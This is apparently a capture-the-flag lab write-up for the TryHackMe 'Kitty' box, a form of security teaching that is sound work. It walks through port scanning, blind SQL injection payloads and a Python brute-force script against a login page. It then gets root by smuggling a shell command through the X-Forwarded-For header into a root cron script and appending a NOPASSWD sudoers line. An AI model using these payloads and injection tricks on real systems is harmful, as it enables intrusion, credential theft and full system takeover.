![](https://tryhackme-images.s3.amazonaws.com/room-icons/4fda99da293ec0bc477a4b9e456e55e1.png)

---
# Nmap Scan:

```Bash
$ scan 10.10.165.50
--------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0c569e6dd6b810cda32be41e35b9787 (RSA)
|   256 6c65ad87087a3e4c7dea3a30764d0416 (ECDSA)
|_  256 2d571d56f6565229eaaada33b2772c9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
--------------------------------------------------------------------
```

---
# Port 80:

```bash
$ feroxbuster -u http://10.10.165.50 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php
--------------------------------------------------------------------
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       36l       76w     1081c http://10.10.165.50/index.php
200      GET       42l      104w     1567c http://10.10.165.50/register.php
200      GET       36l       76w     1081c http://10.10.165.50/
302      GET        0l        0w        0c http://10.10.165.50/welcome.php => index.php
302      GET        0l        0w        0c http://10.10.165.50/logout.php => index.php
200      GET        1l        0w        1c http://10.10.165.50/config.php
--------------------------------------------------------------------
```

index.php: Simple Login Page
config.php: nothing interesting

---

# SQL injection

On the login page the username parameter seems to be vulnerable to SQL injection.

After injecting the following payload: 

```mysql
' OR 1=1;-- -
```

the page gives us this error: SQL Injection detected. This incident will be logged!

So playing around a bit i found a working UNION payload.

```mysql
' UNION SELECT 0,0,0,0;-- -
```

Now we can craft a payload based on this to get the database name.

```sql
' UNION SELECT 0,0,0,0 WHERE Database() like BINARY '%';-- -
```

Everything we put before the `%` will get checked if theres a database starting with a given character. 
Lets take the letter  `A`  for example.
If the database name starts with an `A` we can successfully log in.

 ```' UNION SELECT 0,0,0,0 WHERE Database() like BINARY 'A%';-- -```

If not we get in this case the error "Invalid username or password"

We can do this manually by going through each letter and digit possible, but its going to be a pain in the ass. That's why I wrote a script in python to automate the process

```python
import requests
import string

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_+\{\}[]()/*.,"
url = "http://10.10.88.131/index.php"

result = ''

while True:
	for char in chars:
		query = <PAYLOAD>
		data = {
		'username': query,
		'password': 'blabla'
		}
		
	r = requests.post(url, data=data, allow_redirects=True)
	if "Invalid username or password" in r.text:
		continue
	else:
		result += char
		print(result)
		break
```

---
# Foothold

To get the table and columns names we need to change the payload based on the results we get.

```sql
' UNION SELECT 0,0,0,0 FROM information_schema.tables WHERE table_schema = '<table name>' AND table_name LIKE BINARY '%';-- -
```

```sql
' UNION SELECT 0,0,0,0 FROM information_schema.columns WHERE table_schema = '<table name>' AND table_name = '<column name>' AND column_name LIKE BINARY '%';-- -
```

And to retrieve the password or username:

```sql
' UNION SELECT 0,0,0,0 FROM <table name> WHERE <column name> LIKE '%';-- -
```

Please Note that `BINARY` needs to be in the payload, since the password is case sensitive.

After getting the username and password from enumerating the database we can log in with **SSH**. 

Running `pspy` shows us an interesting script on `/opt`

```bash
2024/02/09 03:32:01 CMD: UID=0     PID=2476   | /usr/bin/bash /opt/log_checker.sh
```

```bash
kitty@kitty:~$ cat /opt/log_checker.sh
--------------------------------------
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

Most of the times when theres something in the `/opt` directory, you might be able to escalate privileges from there. Unfortunately, we don't know how we can abuse this yet because we can only read the file.

This script appears to be reading each line from the file located at `/var/www/development/logged`, appending each line to a file named `logged` located in the `/root` directory, and then clearing the contents of the original file.

So lets see what we can find in `/var/www/development/`

It seems like theres not really much of a difference. Both `development` and `html` directories have the same files but do they contain the same?

```bash
kitty@kitty:~$ diff /var/www/development/ /var/www/html/
diff /var/www/development/index.php /var/www/html/index.php
19,21d18
< 		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
< 		$ip .= "\n";
< 		file_put_contents("/var/www/development/logged", $ip);
24,27c21
< 		echo 'SQL Injection detected. This incident will be logged!';
< 		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
< 		$ip .= "\n";
< 		file_put_contents("/var/www/development/logged", $ip);
---
> 		echo 'SQL Injection detected. This incident will be logged!';
67c61
<         <h2>Development User Login</h2>
---
>         <h2>User Login</h2>
```

The only relevant change here is in `development/index.php` heres the script:

```php
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
	if (preg_match( $evilword, $username )) {
		echo 'SQL Injection detected. This incident will be logged!';
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		$ip .= "\n";
		file_put_contents("/var/www/development/logged", $ip);
		die();
	} elseif (preg_match( $evilword, $password )) {
		echo 'SQL Injection detected. This incident will be logged!';
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		$ip .= "\n";
		file_put_contents("/var/www/development/logged", $ip);
		die();
	}
}
```

--- 
# Privilege Escalation

Each time a SQL injection is detected it gets logged with the `X-Forwarded-For` header into `/var/www/development/logged` and remember the `log_checker.sh` script which reads each line from `logged` and puts it into `/root/logged`? Well now we can abuse this since everything we put as the value of the `X-Forwarded-For` header,  gets written. Lets test this 

```bash
curl 127.0.0.1:8080 -d "username=aaa' or 1=1-- -&password=aaa" -H "X-Forwarded-For: test"
```

It works!

```bash
kitty@kitty:/var/www/development$ cat logged
test
```

Now we just play around a bit until we can inject a command. To test this im going to append the output of id into a file located in a directory we can read. I chose here kitty's home directory.

```bash
curl 127.0.0.1:8080 -d "username=aaa' or 1=1-- -&password=aaa" -H "X-Forwarded-For: id | bash > /home/kitty/out.txt #"
```

```bash
kitty@kitty:~$ cat out.txt
uid=0(root) gid=0(root) groups=0(root)
```

Bingo! we got RCE as root.  This next step is completely optional. You could just inject a reverse shell, but I wanted to be a bit extra by editing the `sudoers` file.

```bash
curl 127.0.0.1:8080 -d "username=aaa' or 1=1-- -&password=aaa" -H "X-Forwarded-For: \$(echo 'kitty ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers)"
```

Now lets run `sudo -l`

```
kitty@kitty:/var/www/development$ sudo -l
Matching Defaults entries for kitty on kitty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kitty may run the following commands on kitty:
    (ALL : ALL) NOPASSWD: ALL
-----------------------------------------------
kitty@kitty:/var/www/development$ sudo su
root@kitty:/var/www/development# cat /root/root.txt
THM{...}
```

# End
